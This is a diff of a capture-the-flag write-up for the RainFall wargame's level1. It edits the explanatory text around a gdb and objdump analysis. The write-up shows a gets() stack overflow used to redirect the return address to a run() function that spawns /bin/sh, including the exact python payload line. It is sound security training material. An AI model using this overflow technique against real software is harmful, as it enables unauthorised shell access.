@@ -49,8 +49,8 @@ Dump of assembler code for function main:
 End of assembler dump.
 
 ********************************************************************************
-We see that there's a call to gets, so we can exploit this to provoke a buffer overflow and write in the 
-edi another address.
+We see that there's a call to gets, so we can exploit this to provoke a buffer
+overflow and write in the eip another address.
 ********************************************************************************
 
 (gdb) disas run
@@ -79,7 +79,8 @@ U�������S��[�Ë��������t�Y����[�
 ...
 
 ********************************************************************************
-There's a call to system and /bin/sh in the binary, so the call to system open a shell, perfect we just need to get the address of run.
+There's a call to system and /bin/sh in the binary, so the call to system open a
+shell, perfect we just need to get the address of run.
 ********************************************************************************
 
 
@@ -87,7 +88,8 @@ level1@RainFall:~$ objdump -d level1 | grep run
 08048444 <run>:
 
 ********************************************************************************
-now we need to convert it in little endian and write it in a file with 80-4=76 other character preceding it.
+now we need to convert it in little endian and write it in a file with 80-4=76
+other characters preceding it.
 ********************************************************************************
 
 level1@RainFall:~$ python -c 'print "a"*76 + "\x44\x84\x04\x08"' > /tmp/exploit
